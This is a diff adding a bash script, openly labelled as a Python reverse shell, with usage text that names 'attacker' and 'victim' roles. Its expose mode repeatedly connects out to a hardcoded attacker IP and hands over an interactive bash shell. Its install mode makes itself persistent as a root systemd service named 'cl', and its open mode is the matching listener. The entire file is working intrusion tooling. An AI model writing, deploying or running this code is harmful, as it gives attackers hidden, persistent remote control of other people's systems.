@@ -1,0 +1,88 @@
+#!/bin/bash
+# Created by @rvcgeeks____ <github.com/rvcgeeks> @Pune, India @12/12/2019, 1:15 am
+# Reverse shell script in python
+  
+  hacker_ip=192.168.43.220
+  base_port=1234
+    
+    
+  case $1 in
+  
+  
+  configure)
+    if [ $# -eq 1 ]; then ip=$(hostname -I | awk '{print $1}')
+    else ip=$2; fi
+    pat='\(hacker_ip=\).*'
+    sed -i -e "0,/$pat/ s/$pat/\1$ip/" $0
+    ;;
+    
+    
+  expose)
+    while [ 1 ] ; do
+      python -c "import socket, pty, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('$hacker_ip', $base_port + $2))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+pty.spawn('/bin/bash')" >> /dev/null 2>&1 
+      sleep 5;
+    done
+    ;;
+    
+    
+  open)
+    sizes=$(stty size)
+    rows=$(echo $sizes | awk '{print $1}')
+    columns=$(echo $sizes | awk '{print $2}')
+    python -c "import socket, os, tty, termios, thread
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(('$hacker_ip', $base_port + $2))
+s.listen(128)
+c, a = s.accept()
+c.send('stty rows $rows columns $columns\n')
+def hear():
+    while True:
+        os.write(1, c.recv(1))
+thread.start_new_thread(hear, tuple())
+old_sett = termios.tcgetattr(0)
+tty.setraw(0)
+while True:
+  try:
+    c.send(os.read(0, 1))
+  except:
+    break
+termios.tcsetattr(0, termios.TCSADRAIN, old_sett)"
+    ;;
+    
+    
+  install) 
+    if [ $EUID -ne 0 ] ; then exit 1 ; fi  
+    cp $0 /bin/cl
+    echo "Wants = network.target
+[Service]
+ExecStart=/bin/cl expose $2
+[Install]
+WantedBy=network-online.target" > /etc/systemd/system/cl.service
+    systemctl daemon-reload
+    systemctl enable cl
+    systemctl start cl
+    ;;
+    
+    
+  uninstall)
+    if [ $EUID -ne 0 ] ; then exit 1 ; fi 
+    systemctl stop cl
+    systemctl disable cl
+    systemctl daemon-reload
+    rm /etc/systemd/system/cl.service
+    rm /bin/cl
+    ;;
+
+    
+  *)
+    printf "\033[48;2;255;0;0m\033[1;94m\033[38;2;255;255;255m            <<< REVERSE SHELL IN PYTHON >>>            \033[0m\nusage >>\n(attacker)$ $0 configure [ip address]\n  (victim)$ $0 [expose | install] (pc no)\n(attacker)$ $0 open (pc no)\n  (victim)$ $0 uninstall\n"
+    ;;
+   
+   
+  esac
